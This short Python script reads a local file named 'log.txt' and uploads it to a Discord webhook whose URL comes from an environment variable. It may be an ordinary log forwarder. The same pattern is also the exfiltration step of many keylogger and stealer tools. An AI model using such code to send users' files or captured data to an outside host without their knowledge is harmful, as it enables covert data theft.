from discord import SyncWebhook
import discord
import dotenv
import os

dotenv.load_dotenv()
os.listdir()
discord_hook = os.environ.get("hook")
webhook = SyncWebhook.from_url(discord_hook)
with open("log.txt") as file:
    data = discord.File(file)

webhook.send(file=data)
